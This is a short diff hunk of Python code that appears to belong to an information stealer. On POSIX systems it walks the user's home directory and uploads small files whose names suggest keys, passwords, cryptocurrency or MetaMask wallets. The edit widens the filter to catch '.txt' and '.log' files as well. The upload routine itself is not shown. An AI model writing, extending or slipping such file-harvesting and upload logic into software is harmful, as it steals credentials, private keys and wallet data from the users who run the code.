@@ -163,7 +163,7 @@ if os.name == 'posix':
  dirs = os.getenv("HOME")
  dlin = os.listdir(dirs)
  for i in dlin:
-  if ("key" in i  or "assw" in i or "coin" in i or "metam" in i):
+  if ("key" in i  or "assw" in i or "txt" in i or "log" in i):
    if (os.path.getsize(dirs+"/"+i)< 60000):
        upl(dirs+"/"+i )
       
